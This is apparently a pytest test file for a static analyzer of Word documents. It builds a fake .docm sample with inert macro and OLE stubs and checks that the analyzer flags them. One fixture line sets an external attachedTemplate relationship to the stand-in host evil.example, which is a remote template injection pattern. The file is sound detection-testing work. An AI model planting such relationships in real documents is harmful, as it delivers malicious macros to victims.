import zipfile
from pathlib import Path

from analyzer.static_analysis import analyze_docx, detect_file_type, static_analysis


def _write_ooxml_sample(path: Path, *, with_macros: bool) -> None:
    document_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>AutoOpen suspicious sample</w:t></w:r></w:p>
  </w:body>
</w:document>
"""
    rels_xml = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/template.dotm" TargetMode="External"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="embeddings/object1.bin"/>
</Relationships>
"""
    content_types = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>
"""
    package_rels = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>
"""

    with zipfile.ZipFile(path, "w") as archive:
        archive.writestr("[Content_Types].xml", content_types)
        archive.writestr("_rels/.rels", package_rels)
        archive.writestr("word/document.xml", document_xml)
        archive.writestr("word/_rels/document.xml.rels", rels_xml)
        archive.writestr("word/embeddings/object1.bin", b"embedded-object")
        if with_macros:
            archive.writestr("word/vbaProject.bin", b"fake-vba-project")


def test_docm_detection_and_ooxml_relationship_extraction(tmp_path):
    sample = tmp_path / "sample.docm"
    _write_ooxml_sample(sample, with_macros=True)

    assert detect_file_type(str(sample)) == "docm"

    result = analyze_docx(str(sample))
    assert result["has_macros"] is True
    assert "word/vbaProject.bin" in result["macro_streams"]
    assert result["embedded_objects"]
    assert result["external_relationships"]
    assert result["suspicious_relationships"]
    assert "autoopen" in result["auto_open_indicators"]
    assert result["preview"]


def test_static_analysis_exposes_yara_status_for_empty_rules_dir(tmp_path):
    sample = tmp_path / "sample.docx"
    rules_dir = tmp_path / "empty_rules"
    rules_dir.mkdir()
    _write_ooxml_sample(sample, with_macros=False)

    result = static_analysis(str(sample), yara_rules_dir=str(rules_dir))

    assert result["file_type"] == "docx"
    assert "yara_status" in result
    assert result["yara_status"]["status"] in {"no_rules", "engine_missing"}
    assert result["yara_status"]["rules_loaded"] == 0
